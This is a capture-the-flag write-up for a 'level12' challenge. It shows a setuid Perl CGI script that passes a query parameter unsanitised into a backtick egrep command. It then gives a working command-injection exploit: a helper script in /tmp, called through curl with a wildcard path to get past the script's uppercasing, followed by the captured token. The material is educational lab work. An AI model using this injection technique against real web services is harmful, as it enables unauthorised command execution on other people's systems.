# level12 solution
Given perl setuiid script which runs on localhost on port 4646:
    
    #!/usr/bin/env perl
    # localhost:4646
    use CGI qw{param};
    print "Content-type: text/html\n\n";

    sub t {
    $nn = $_[1];
    $xx = $_[0];
    $xx =~ tr/a-z/A-Z/; 
    $xx =~ s/\s.*//;
    @output = `egrep "^$xx" /tmp/xd 2>&1`;
    foreach $line (@output) {
        ($f, $s) = split(/:/, $line);
        if($s =~ $nn) {
            return 1;
        }
    }
    return 0;
    }

    sub n {
    if($_[0] == 1) {
        print("..");
    } else {
        print(".");
    }    
    }

    n(t(param("x"), param("y")));

There is an egrep call with unprotected argument provided by x parameter:

    @output = `egrep "^$xx" /tmp/xd 2>&1`;

But value of this parameter would be changed before egrep call:

    $xx =~ tr/a-z/A-Z/; 
    $xx =~ s/\s.*//;

All lower case letters would be replaced by upper case and everything after space letter would be removed. We can not insert getflag call directly, but we can create script with getflag call and insert this script:

    echo "getflag > /tmp/level12_token" > /tmp/RUN
    chmod +x /tmp/RUN
    curl 127.0.0.1:4646?x=\`/*/RUN\`
    cat /tmp/level12_token
    Check flag.Here is your token : g1qKMiRpXf53AWhDaU7FEkczr